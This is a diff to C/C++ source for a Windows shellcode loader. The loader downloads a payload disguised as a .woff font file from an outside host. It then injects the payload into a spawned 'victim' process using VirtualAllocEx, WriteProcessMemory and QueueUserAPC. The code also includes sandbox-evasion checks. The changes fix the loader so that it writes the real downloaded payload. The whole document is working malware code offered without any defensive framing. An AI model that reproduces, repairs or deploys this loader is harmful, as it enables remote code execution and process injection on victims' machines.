@@ -91,7 +91,6 @@ _EndOfFunction:
 	return bSTATE;
 }
 
-
 BOOL CheckVirtualAllocExNuma(){
     HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
     if (hKernel32 == NULL) {
@@ -128,14 +127,12 @@ void evade() {
 };
 
 int main() {
-    evade();
+    //evade();
     LPCWSTR url = L"http://10.0.0.47/shellcode.woff";
     PBYTE pPayloadBytes = NULL;
     SIZE_T sPayloadSize = NULL;
     
-    bool shellcode = GetPayloadFromUrl(url, &pPayloadBytes, &sPayloadSize);
-    
-    int payload_len = sizeof(shellcode);
+    GetPayloadFromUrl(url, &pPayloadBytes, &sPayloadSize);
     
     STARTUPINFOA si = { 0 };
     PROCESS_INFORMATION pi = { 0 };
@@ -145,16 +142,11 @@ int main() {
     HANDLE victimProcess = pi.hProcess;
     HANDLE threadHandle = pi.hThread;
 
-    LPVOID shellAddress = VirtualAllocEx(victimProcess, NULL, payload_len, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
-    if (shellAddress == NULL) {
-        return 1;
-    }
+    LPVOID shellAddress = VirtualAllocEx(victimProcess, NULL, sPayloadSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
 
     PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)shellAddress;
-
-    PBYTE payload = (PBYTE)shellcode;
     
-    WriteProcessMemory(victimProcess, shellAddress, payload, (SIZE_T) payload_len, NULL);
+    WriteProcessMemory(victimProcess, shellAddress, pPayloadBytes, sPayloadSize, NULL);
 
     QueueUserAPC((PAPCFUNC)apcRoutine, threadHandle, NULL);
 
